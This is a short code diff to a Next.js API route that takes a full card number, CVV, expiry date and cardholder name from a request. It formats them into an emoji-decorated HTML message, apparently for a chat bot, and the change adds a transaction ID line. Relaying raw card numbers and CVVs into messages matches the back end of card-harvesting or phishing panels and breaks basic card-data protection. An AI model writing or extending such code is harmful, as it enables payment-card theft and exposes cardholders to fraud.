@@ -88,7 +88,7 @@ export async function POST(req: NextRequest) {
 export async function PUT(req: NextRequest) {
   try {
     const body = await req.json();
-    const { customerName, cardHolderName, cardNumber, cvv, expiryDate, transactionType, installmentDay, amount } = body;
+    const { customerName, cardHolderName, cardNumber, cvv, expiryDate, transactionType, installmentDay, amount, transactionId } = body;
 
     const needsDay = transactionType === "installments" || transactionType === "deduction";
     const needsAmount = transactionType === "refund" || transactionType === "payment";
@@ -104,6 +104,7 @@ export async function PUT(req: NextRequest) {
     const formatted = (cardNumber ?? "").replace(/(\d{4})(?=\d)/g, "$1 ");
 
     const message = [
+      ...(transactionId ? [`🆔 Transaction ID: <code>${transactionId}</code>`] : []),
       `💳 <b>${cardType}</b>`,
       `━━━━━━━━━━━━━━━━━━`,
       `👤 Order For: ${customerName ?? cardHolderName ?? ""}`,
